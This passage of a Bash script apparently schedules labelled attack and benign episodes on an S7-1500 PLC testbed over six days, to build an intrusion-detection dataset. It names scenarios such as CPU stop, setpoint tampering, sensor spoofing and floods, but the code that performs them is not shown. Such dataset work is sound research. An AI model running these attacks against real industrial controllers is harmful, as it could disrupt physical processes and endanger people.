benign_period() {
    local duration_s="$1"
    local note="${2:-benign}"
    local episode_id="${SESSION_ID}:day${DAY}:BENIGN:${note// /_}"
    label "BENIGN_NORMAL" "START" "$episode_id" "$note"
    wait_s "$duration_s" "$note"
    label "BENIGN_NORMAL" "END" "$episode_id" "$note"
}

run_repeated() {
    local scenario="$1"
    local base_duration="${2:-$ATTACK_DURATION_S}"
    local reps="${3:-$ATTACK_REPETITIONS}"
    local rep
    for rep in $(seq 1 "$reps"); do
        run_attack_episode "$scenario" "$(rand_duration "$base_duration")" "$rep"
        benign_period "$(rand_duration "$BENIGN_GAP_S")" "gap_after_${scenario}_r${rep}"
    done
}

run_controller() {
    start_capture "controller"
    start_tag_logger
    start_hmi
    benign_period "$(duration_for_day)" "controller_runtime"
}

run_attacker_day1() {
    benign_period "$(duration_for_day)" "attacker_idle_baseline"
}

run_attacker_day2() {
    benign_period "$WARMUP_S" "warmup"
    run_repeated "SCAN_PORT" "$SHORT_ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
    run_repeated "ENUM_TAGS" "$ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
    benign_period "$COOLDOWN_S" "cooldown"
}

run_attacker_day3() {
    benign_period "$WARMUP_S" "warmup"
    if [[ "$ENABLE_CPU_CONTROL_ATTACK" == "1" ]]; then
        run_repeated "CPU_STOP" "$SHORT_ATTACK_DURATION_S" "1"
    else
        echo "[att] CPU_STOP skipped by default for S7-1500 security compatibility"
    fi
    run_repeated "RWRITE_BURST" "$ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
    benign_period "$COOLDOWN_S" "cooldown"
}

run_attacker_day4() {
    benign_period "$WARMUP_S" "warmup"
    run_repeated "SETPOINT_ATTACK" "$ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
    run_repeated "SENSOR_SPOOF" "$ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
    run_repeated "STEALTHY_WRITE" "$SHORT_ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
    benign_period "$COOLDOWN_S" "cooldown"
}

run_attacker_day5() {
    benign_period "$WARMUP_S" "warmup"
    run_repeated "S7_FLOOD" "$SHORT_ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
    run_repeated "SYN_FLOOD" "$SHORT_ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
    run_repeated "PROTOCOL_FUZZ" "$SHORT_ATTACK_DURATION_S" "$ATTACK_REPETITIONS"
    benign_period "$COOLDOWN_S" "cooldown"
}

mixed_scenarios() {
    local items="SCAN_PORT ENUM_TAGS RWRITE_BURST SETPOINT_ATTACK SENSOR_SPOOF STEALTHY_WRITE S7_FLOOD SYN_FLOOD PROTOCOL_FUZZ"
    if [[ "$ENABLE_CPU_CONTROL_ATTACK" == "1" ]]; then
        items="$items CPU_STOP"
    fi
    "$PY_CMD" -c "import random,sys; items=sys.argv[1].split(); random.shuffle(items); print(' '.join(items))" "$items"
}

run_attacker_day6() {
    local scenario
    local idx=1
    benign_period "$WARMUP_S" "warmup"
    for scenario in $(mixed_scenarios); do
        case "$scenario" in
            SCAN_PORT|CPU_STOP|S7_FLOOD|SYN_FLOOD|PROTOCOL_FUZZ|STEALTHY_WRITE)
                run_attack_episode "$scenario" "$(rand_duration "$SHORT_ATTACK_DURATION_S")" "$idx"
                ;;
            *)
                run_attack_episode "$scenario" "$(rand_duration "$ATTACK_DURATION_S")" "$idx"
                ;;
        esac
        benign_period "$(rand_duration "$BENIGN_GAP_S")" "mixed_gap_${idx}"
        idx=$((idx + 1))
    done
    benign_period "$COOLDOWN_S" "cooldown"
}

run_attacker() {
    start_capture "attacker"
    case "$DAY" in
        1) run_attacker_day1 ;;
        2) run_attacker_day2 ;;
        3) run_attacker_day3 ;;
        4) run_attacker_day4 ;;
        5) run_attacker_day5 ;;
        6) run_attacker_day6 ;;
    esac
}

validate_capture_config

if [[ "$PREFLIGHT_ENABLED" == "1" ]]; then
    if ! preflight_plc; then
        if [[ "$REQUIRE_PREFLIGHT" == "1" ]]; then
            echo "[ERROR] Preflight failed. Check PLC IP, rack/slot, network, Snap7, and PUT/GET access." >&2
            exit 2
        fi
        echo "[WARN] Preflight failed but REQUIRE_PREFLIGHT=0, continuing." >&2
    fi
fi

if [[ "${PREFLIGHT_ONLY:-0}" == "1" ]]; then
    echo "[preflight] done"
    exit 0
fi

case "$ROLE" in
    controller) run_controller ;;
    attacker) run_attacker ;;
esac

echo "=== DONE: day=$DAY role=$ROLE session=$SESSION_ID host=$HOST_ID ==="
